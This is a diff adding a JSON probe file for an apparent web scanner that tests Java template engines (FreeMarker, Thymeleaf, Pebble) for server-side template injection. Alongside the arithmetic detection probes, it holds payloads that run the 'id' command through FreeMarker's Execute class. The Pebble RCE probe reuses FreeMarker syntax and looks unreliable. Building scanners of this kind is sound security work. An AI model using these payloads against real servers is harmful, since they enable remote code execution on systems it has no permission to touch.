@@ -1,0 +1,177 @@
+{
+  "category": "ssti_java",
+  "description": " \u2014 Java engines (FreeMarker, Thymeleaf, Pebble)",
+  "contexts": {
+    "freemarker": {
+      "description": "Server-Side Template Injection probes for Apache FreeMarker (Java/Spring/Tomcat stacks)",
+      "tech_match": [
+        "Java",
+        "Spring",
+        "Tomcat"
+      ],
+      "param_match": [
+        "name",
+        "template",
+        "msg",
+        "text",
+        "title",
+        "comment",
+        "input",
+        "value",
+        "q"
+      ],
+      "probes": [
+        {
+          "payload": "${7*7}",
+          "description": "FreeMarker expression evaluation \u2014 49 confirms SSTI",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "49"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "$49",
+                "49 ",
+                " 49.",
+                "\"49\"",
+                "v49",
+                "#49"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 65,
+          "variables": {}
+        },
+        {
+          "payload": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
+          "description": "FreeMarker RCE probe via Execute class \u2014 uid= in response confirms code execution",
+          "matchers": [
+            {
+              "type": "regex",
+              "pattern": "uid=\\d+"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 95,
+          "variables": {}
+        }
+      ]
+    },
+    "thymeleaf": {
+      "description": "Server-Side Template Injection probes for Thymeleaf (Spring/Java stacks)",
+      "tech_match": [
+        "Spring",
+        "Java"
+      ],
+      "param_match": [
+        "name",
+        "template",
+        "msg",
+        "text",
+        "title",
+        "comment",
+        "input",
+        "value",
+        "q"
+      ],
+      "probes": [
+        {
+          "payload": "__${7*7}__",
+          "description": "Thymeleaf preprocessing expression \u2014 49 confirms SSTI",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "49"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "$49",
+                "49 ",
+                " 49.",
+                "\"49\"",
+                "v49",
+                "#49"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 65,
+          "variables": {}
+        }
+      ]
+    },
+    "pebble": {
+      "description": "Server-Side Template Injection probes for Java Pebble templates",
+      "tech_match": [
+        "Java",
+        "Spring"
+      ],
+      "param_match": [
+        "name",
+        "template",
+        "msg",
+        "text",
+        "title",
+        "comment",
+        "input",
+        "value",
+        "q"
+      ],
+      "probes": [
+        {
+          "payload": "{{ 7 * 7 }}",
+          "description": "Pebble arithmetic evaluation \u2014 49 confirms Pebble template processing",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "49"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "$49",
+                "49 ",
+                " 49.",
+                "\"49\"",
+                "v49",
+                "#49"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        },
+        {
+          "payload": "{{'freemarker.template.utility.Execute'?new()('id')}}",
+          "description": "Pebble RCE attempt via class instantiation \u2014 uid= confirms code execution if engine allows it",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "uid="
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 90,
+          "variables": {}
+        }
+      ]
+    }
+  }
+}
